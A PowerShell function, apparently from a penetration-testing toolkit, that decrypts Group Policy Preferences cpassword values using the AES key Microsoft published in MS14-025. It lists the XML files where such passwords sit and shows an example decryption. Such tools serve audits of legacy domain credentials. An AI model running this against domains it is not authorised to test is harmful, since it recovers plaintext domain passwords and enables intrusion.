<#
.SYNOPSIS
    Decrypts Group Policy Preferences (GPP) passwords using the published AES key.

.DESCRIPTION
    Microsoft published the AES-256 key used for cpassword encryption in MS14-025 (CVE-2014-1812).
    This function decrypts GPP passwords using that known key.

    GPP passwords were stored encrypted in XML files:
    - Groups.xml (local group memberships)
    - Services.xml (Windows services)
    - ScheduledTasks.xml (scheduled tasks)
    - DataSources.xml (ODBC data sources)
    - Printers.xml (printer mappings)
    - Drives.xml (network drive mappings)

.PARAMETER EncryptedPassword
    The cpassword value from GPP XML files (Base64-encoded AES-encrypted string).

.EXAMPLE
    ConvertFrom-GPPPassword -EncryptedPassword "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
    Returns: P@ssw0rd123

.EXAMPLE
    # From XML parsing
    [xml]$xml = Get-Content "Groups.xml"
    $cpassword = $xml.Groups.User.Properties.cpassword
    $plaintext = ConvertFrom-GPPPassword -EncryptedPassword $cpassword

.OUTPUTS
    String - Decrypted plaintext password

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>

function ConvertFrom-GPPPassword {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true)]
        [ValidateNotNullOrEmpty()]
        [string]$EncryptedPassword
    )

    begin {
        Write-Log "[ConvertFrom-GPPPassword] Starting GPP password decryption"
    }

    process {
        try {
            # Validate input - must contain only Base64 characters
            if ($EncryptedPassword -notmatch '^[A-Za-z0-9+/=]+$') {
                Write-Log "[ConvertFrom-GPPPassword] Invalid Base64 format: $EncryptedPassword"
                return "[Invalid Format]"
            }

            # Fix Base64 padding (cpassword often lacks proper padding)
            $paddedPassword = $EncryptedPassword
            $mod = $paddedPassword.Length % 4
            switch ($mod) {
                1 { $paddedPassword = $paddedPassword.Substring(0, $paddedPassword.Length - 1) }
                2 { $paddedPassword += '==' }
                3 { $paddedPassword += '=' }
            }

            Write-Log "[ConvertFrom-GPPPassword] Original: $EncryptedPassword, Padded: $paddedPassword"

            # Microsoft's published AES-256 key (MS14-025), This key was intentionally published by Microsoft to deprecate GPP passwords
            $aesKeyBytes = @(
                0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,
                0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,
                0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b
            )

            Write-Log "[ConvertFrom-GPPPassword] Decoding Base64: $paddedPassword"

            # Decode Base64 to encrypted bytes
            $encryptedBytes = [System.Convert]::FromBase64String($paddedPassword)

            Write-Log "[ConvertFrom-GPPPassword] Encrypted data length: $($encryptedBytes.Length) bytes"

            # Validate encrypted data length (should be multiple of 16 for AES)
            if ($encryptedBytes.Length -eq 0 -or ($encryptedBytes.Length % 16) -ne 0) {
                Write-Log "[ConvertFrom-GPPPassword] Invalid encrypted data length: $($encryptedBytes.Length)"
                return "[Invalid Data Length]"
            }

            # Create AES decryptor
            $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            $aes.Key = $aesKeyBytes
            $aes.IV = New-Object Byte[] 16  # IV is all zeros for GPP
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros

            # Decrypt
            $decryptor = $aes.CreateDecryptor()
            $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)

            # Convert to Unicode string and trim padding
            $decryptedPassword = [System.Text.Encoding]::Unicode.GetString($decryptedBytes)

            # Remove AES padding artifacts (null bytes and any trailing non-printable chars)
            # GPP passwords are ASCII-safe, so we can safely trim anything non-printable
            # This handles: null bytes (0x00), and padding remnants like ఌ (0x0C0C), Ȃ (0x0202), ฎ (0x0E0E)
            $cleanPassword = ""
            foreach ($char in $decryptedPassword.ToCharArray()) {
                $code = [int]$char
                # Keep only printable ASCII range (space to tilde) and common extended chars
                if ($code -ge 32 -and $code -le 126) {
                    $cleanPassword += $char
                }
                elseif ($code -ge 128 -and $code -le 255) {
                    # Extended ASCII (accented chars, etc.) - keep these too
                    $cleanPassword += $char
                }
                elseif ($code -eq 0) {
                    # Null byte - stop here (rest is padding)
                    break
                }
                # Skip other control chars and Unicode oddities (padding artifacts)
            }
            $decryptedPassword = $cleanPassword

            # Cleanup
            $decryptor.Dispose()
            $aes.Dispose()

            Write-Log "[ConvertFrom-GPPPassword] Decryption successful"

            return $decryptedPassword

        } catch [System.FormatException] {
            Write-Log "[ConvertFrom-GPPPassword] Base64 decode error: $_"
            return "[Base64 Decode Failed]"

        } catch [System.Security.Cryptography.CryptographicException] {
            Write-Log "[ConvertFrom-GPPPassword] Decryption error: $_"
            return "[Decryption Failed]"

        } catch {
            Write-Log "[ConvertFrom-GPPPassword] Unexpected error: $_"
            return "[Decryption Failed]"
        }
    }

    end {
        Write-Log "[ConvertFrom-GPPPassword] Decryption completed"
    }
}
